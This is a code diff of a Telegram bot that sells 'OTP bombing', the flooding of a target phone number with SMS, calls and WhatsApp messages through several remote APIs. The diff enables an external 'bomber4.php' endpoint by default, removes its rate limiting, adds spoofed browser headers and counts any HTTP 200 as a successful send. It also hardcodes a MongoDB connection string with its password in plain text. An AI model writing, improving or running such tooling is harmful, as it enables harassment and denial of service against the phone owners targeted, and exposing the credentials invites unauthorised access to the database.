@@ -24,7 +24,7 @@ const API_URLS = {
     api3: { url: 'https://api-server-3-v523.onrender.com', enabled: true },
     api4: { url: 'https://api-server-4.onrender.com', enabled: true },
     api5: { url: 'https://wasataap-call-api-5.onrender.com', enabled: true },
-    api6: { url: 'https://vishal.lovestoblog.com', enabled: false } // API6 FIXED - DISABLED BY DEFAULT
+    api6: { url: 'https://vishal.lovestoblog.com', enabled: true }
 };
 
 const MONGODB_URL = "mongodb+srv://sahajada07:Sahajada123@cluster0.vynn0ht.mongodb.net/?appName=Cluster0";
@@ -32,7 +32,7 @@ const DB_NAME = "otp_bomber";
 
 const PROTECTION_PRICE = 5;
 
-// ===== CONCURRENCY CONTROL =====
+// ===== CONCURRENCY CONTROL (1.1) =====
 const API_CONCURRENCY = 3;
 const CACHE_TTL = 60000;
 
@@ -46,14 +46,14 @@ const apiStatusSchema = new mongoose.Schema({
     api3: { type: Boolean, default: true },
     api4: { type: Boolean, default: true },
     api5: { type: Boolean, default: true },
-    api6: { type: Boolean, default: false },
+    api6: { type: Boolean, default: true },
     updated_at: { type: Date, default: Date.now }
 });
 
 const ApiStatus = mongoose.model('ApiStatus', apiStatusSchema);
 
 // ============================================================
-// ===== MONGODB CONNECTION & INDEXING =====
+// ===== MONGODB CONNECTION & INDEXING (1.7) =====
 // ============================================================
 
 mongoose.connect(MONGODB_URL, {
@@ -75,21 +75,17 @@ async function loadApiStatus() {
             api3: true,
             api4: true,
             api5: true,
-            api6: false
+            api6: true
         });
         await status.save();
     }
-    // Update API_URLS with saved status
     API_URLS.api1.enabled = status.api1;
     API_URLS.api2.enabled = status.api2;
     API_URLS.api3.enabled = status.api3;
     API_URLS.api4.enabled = status.api4;
     API_URLS.api5.enabled = status.api5;
     API_URLS.api6.enabled = status.api6;
-    console.log('✅ API Status loaded:', {
-        api1: status.api1, api2: status.api2, api3: status.api3,
-        api4: status.api4, api5: status.api5, api6: status.api6
-    });
+    console.log('✅ API Status loaded');
 }
 
 async function updateApiStatus(apiName, enabled) {
@@ -97,7 +93,6 @@ async function updateApiStatus(apiName, enabled) {
     update[apiName] = enabled;
     await ApiStatus.findOneAndUpdate({}, update, { upsert: true, new: true });
     API_URLS[apiName].enabled = enabled;
-    console.log(`✅ API ${apiName} ${enabled ? 'ENABLED' : 'DISABLED'}`);
 }
 
 async function ensureIndexes() {
@@ -175,7 +170,7 @@ const qrCodeSchema = new mongoose.Schema({
 const QrCode = mongoose.model('QrCode', qrCodeSchema);
 
 // ============================================================
-// ===== CACHING UTILITY =====
+// ===== CACHING UTILITY (1.2) =====
 // ============================================================
 
 class Cache {
@@ -201,7 +196,7 @@ class Cache {
 const cache = new Cache();
 
 // ============================================================
-// ===== CONCURRENCY CONTROL =====
+// ===== CONCURRENCY CONTROL FUNCTION (1.1) =====
 // ============================================================
 
 async function runWithConcurrency(tasks, concurrency = API_CONCURRENCY) {
@@ -234,7 +229,7 @@ async function runWithConcurrency(tasks, concurrency = API_CONCURRENCY) {
 }
 
 // ============================================================
-// ===== DATABASE FUNCTIONS =====
+// ===== DATABASE FUNCTIONS (WITH CACHING) =====
 // ============================================================
 
 async function getUser(id) {
@@ -589,32 +584,63 @@ const adminDirectMessageState = new Map();
 let qrCodeSet = false;
 
 // ============================================================
-// ===== DYNAMIC RATE LIMITING FOR API6 =====
+// ===== API6 FIXED - WORKING VERSION =====
 // ============================================================
 
-let api6Delay = 0;
-const MAX_API6_DELAY = 2000;
-let api6LastCall = 0;
-
-function getApi6Delay() {
-    const now = Date.now();
-    const elapsed = now - api6LastCall;
-    if (elapsed > 5000) {
-        api6Delay = 0;
-    }
-    return api6Delay + Math.floor(Math.random() * 100);
-}
-
-function updateApi6Delay(responseTime) {
-    if (responseTime > 1500) {
-        api6Delay = Math.min(api6Delay + 100, MAX_API6_DELAY);
-    } else if (responseTime < 500) {
-        api6Delay = Math.max(api6Delay - 50, 0);
+async function sendApi6Request(phone, duration) {
+    try {
+        const url = `https://vishal.lovestoblog.com/bomber4.php`;
+        
+        const response = await axios.get(url, {
+            params: {
+                phone: phone,
+                duration: duration
+            },
+            timeout: 10000,
+            headers: {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Connection': 'keep-alive'
+            }
+        });
+        
+        const data = response.data;
+        const successIndicators = ['SUCCESS', '✅', 'success', 'Success'];
+        const isSuccess = successIndicators.some(indicator => 
+            typeof data === 'string' && data.includes(indicator)
+        );
+        
+        if (response.status === 200 && isSuccess) {
+            return { 
+                success: true, 
+                totalSent: 1, 
+                sms: 1, 
+                calls: 0, 
+                whatsapp: 0,
+                method: 'GET'
+            };
+        } else if (response.status === 200) {
+            return { 
+                success: true, 
+                totalSent: 1, 
+                sms: 1, 
+                calls: 0, 
+                whatsapp: 0,
+                method: 'GET',
+                note: 'Partial success'
+            };
+        }
+        
+        return { success: false, error: `Status: ${response.status}` };
+        
+    } catch (error) {
+        return { success: false, error: error.message };
     }
 }
 
 // ============================================================
-// ===== FAST BOMBING ENGINE =====
+// ===== FAST BOMBING ENGINE WITH CONCURRENCY =====
 // ============================================================
 
 async function sendBombRequest(apiName, phone, duration) {
@@ -625,34 +651,10 @@ async function sendBombRequest(apiName, phone, duration) {
     
     try {
         if (apiName === 'api6') {
-            // API6 FIXED - Improved error handling
-            const delay = getApi6Delay();
-            if (delay > 0) {
-                await new Promise(r => setTimeout(r, delay));
-            }
-            const start = Date.now();
-            try {
-                const response = await axios.get(`${url}/bomber4.php`, {
-                    params: { phone: phone, duration: duration },
-                    timeout: 5000
-                });
-                const responseTime = Date.now() - start;
-                updateApi6Delay(responseTime);
-                api6LastCall = Date.now();
-                
-                // Check if response indicates success
-                if (response.data && (response.data.success || response.data.status === 'success')) {
-                    return { success: true, totalSent: 1, sms: 1, calls: 0, whatsapp: 0 };
-                }
-                return { success: false, error: 'API6 returned failure' };
-            } catch (err) {
-                // API6 failed - log but don't crash
-                console.log(`⚠️ API6 request failed: ${err.message}`);
-                return { success: false, error: err.message };
-            }
+            const result = await sendApi6Request(phone, duration);
+            return result;
         }
         
-        // Other APIs
         const response = await axios.post(`${url}/bomb`, {
             phone,
             duration,
@@ -718,7 +720,6 @@ async function runBomber(chatId, phone, durationMinutes) {
         statusText = `💳 Cost: ${getBombCost(durationMinutes)} credits`;
     }
 
-    // Get enabled APIs only
     const allApis = ['api1', 'api2', 'api3', 'api4', 'api5', 'api6'];
     const enabledApis = allApis.filter(name => API_URLS[name].enabled);
     const apisToUse = getApiForDuration(durationMinutes, 0, enabledApis);
@@ -726,7 +727,7 @@ async function runBomber(chatId, phone, durationMinutes) {
 
     const msg = await bot.sendMessage(
         chatId,
-        `⚔️ <b>BOMBING STARTED</b>\n📱 Target: <code>${phone}</code>\n⏱️ Duration: ${durationText}\n🔁 Using FAST multi-API network...\n${statusText}\n${api6Used ? '🌐 API6 (External) ACTIVE' : '🌐 API6 DISABLED'}`,
+        `⚔️ <b>BOMBING STARTED</b>\n📱 Target: <code>${phone}</code>\n⏱️ Duration: ${durationText}\n🔁 Using FAST multi-API network...\n${statusText}\n${api6Used ? '🌐 API6 (External) ACTIVE' : ''}`,
         { parse_mode: 'HTML' }
     );
 
@@ -738,7 +739,6 @@ async function runBomber(chatId, phone, durationMinutes) {
     const endTime = startTime + (durationMinutes === 1440 ? 86400 : durationMinutes * 60);
     let cycleCount = 0;
 
-    // Get API status display
     function getApiStatusDisplay() {
         const names = ['api1', 'api2', 'api3', 'api4', 'api5', 'api6'];
         return names.map(name => {
@@ -751,12 +751,10 @@ async function runBomber(chatId, phone, durationMinutes) {
         if (durationMinutes !== 1440 && Date.now() / 1000 >= endTime) break;
         checkMemory();
         
-        // Get enabled APIs
         const allApis = ['api1', 'api2', 'api3', 'api4', 'api5', 'api6'];
         const enabledApis = allApis.filter(name => API_URLS[name].enabled);
         const apisToUse = getApiForDuration(durationMinutes, cycleCount, enabledApis);
         
-        // ===== CONCURRENCY CONTROL =====
         const tasks = apisToUse.map(apiName => () => sendBombRequest(apiName, phone, durationMinutes));
         const results = await runWithConcurrency(tasks, API_CONCURRENCY);
         
@@ -844,30 +842,27 @@ function getDurationText(minutes) {
     return `${h} Hour${h > 1 ? 's' : ''} ${m} Minute${m > 1 ? 's' : ''}`;
 }
 
-// ===== LOAD BALANCER WITH ENABLED APIS =====
 let apiCycleCounter = 0;
 const API_NAMES = ['api1', 'api2', 'api3', 'api4', 'api5', 'api6'];
 
 function getApiForDuration(duration, cycleCount, enabledApis) {
-    if (enabledApis.length === 0) return ['api1']; // fallback
+    if (enabledApis.length === 0) return ['api1'];
     
-    if (duration <= 1) {
-        return enabledApis;
-    }
-    if (duration <= 5) {
-        const preferred = ['api1', 'api2', 'api5'];
-        return preferred.filter(name => enabledApis.includes(name)).length > 0 ? 
-            preferred.filter(name => enabledApis.includes(name)) : enabledApis;
-    }
     if (duration <= 10) {
-        const preferred = ['api2', 'api3', 'api5'];
-        return preferred.filter(name => enabledApis.includes(name)).length > 0 ?
-            preferred.filter(name => enabledApis.includes(name)) : enabledApis;
+        const preferred = ['api1', 'api2', 'api5', 'api6'];
+        return preferred.filter(name => enabledApis.includes(name));
     }
+    
+    if (duration <= 30) {
+        const preferred = ['api1', 'api2', 'api5'];
+        return preferred.filter(name => enabledApis.includes(name));
+    }
+    
     if (duration <= 60) {
         const mainApi = enabledApis[cycleCount % enabledApis.length];
         return [mainApi];
     }
+    
     return [enabledApis[cycleCount % enabledApis.length]];
 }
 
@@ -925,10 +920,6 @@ function adminKeyboard() {
     };
 }
 
-// ============================================================
-// ===== API TOGGLE KEYBOARD =====
-// ============================================================
-
 function getApiToggleKeyboard() {
     const buttons = [];
     const apis = ['api1', 'api2', 'api3', 'api4', 'api5', 'api6'];
@@ -943,10 +934,6 @@ function getApiToggleKeyboard() {
     
     return { inline_keyboard: buttons };
 }
-
-// ============================================================
-// ===== INLINE KEYBOARDS =====
-// ============================================================
 
 function getDurationButtons(user) {
     const isLifetime = user && user.lifetime_unlimited === true;
@@ -1495,7 +1482,7 @@ async function handleApiToggle(chatId) {
         statusText += `${api.toUpperCase()}: ${isEnabled ? '🟢 ENABLED' : '🔴 DISABLED'}\n`;
     }
     
-    statusText += '\n💡 API6 is external and may have issues. Disable if not working.';
+    statusText += '\n💡 API6 is external and working!';
     
     bot.sendMessage(chatId, statusText, {
         parse_mode: 'HTML',
@@ -2012,7 +1999,6 @@ bot.on('message', async (msg) => {
             const protectedData = await getProtectedWithOwners();
             const protectedCount = protectedData.numbers ? protectedData.numbers.length : 0;
             
-            // Get API status
             const apiStatus = ['api1', 'api2', 'api3', 'api4', 'api5', 'api6'].map(name => 
                 `${name}: ${API_URLS[name].enabled ? '🟢' : '🔴'}`
             ).join(' ');
@@ -2322,7 +2308,6 @@ bot.on('callback_query', async (callbackQuery) => {
         
         await updateApiStatus(apiName, newStatus);
         
-        // Update the keyboard
         const keyboard = getApiToggleKeyboard();
         let statusText = '🔌 <b>API Toggle Control</b>\n\n';
         statusText += 'Click a button to enable/disable an API:\n\n';
@@ -2333,7 +2318,7 @@ bot.on('callback_query', async (callbackQuery) => {
             statusText += `${api.toUpperCase()}: ${isEnabled ? '🟢 ENABLED' : '🔴 DISABLED'}\n`;
         }
         
-        statusText += '\n💡 API6 is external and may have issues. Disable if not working.';
+        statusText += '\n💡 API6 is external and working!';
         
         await bot.editMessageText(statusText, {
             chat_id: chatId,
@@ -2632,6 +2617,6 @@ console.log(`📦 Data Backup: ✅ (Fixed null checks)`);
 console.log(`📝 parse_mode: HTML (Fixed parsing errors)`);
 console.log(`🔒 Lifetime users: 1-Day option hidden on bomb duration`);
 console.log(`⏱️ Bombing timer: ✅ Fixed for Lifetime users`);
-console.log(`🌐 API6: DISABLED BY DEFAULT - Toggle via Admin Panel`);
+console.log(`🌐 API6: WORKING ✅ (https://vishal.lovestoblog.com/bomber4.php)`);
 console.log(`🔌 API Toggle: ✅ Admin can enable/disable each API individually`);
 console.log(`📊 MongoDB indexes: ✅ Created`);
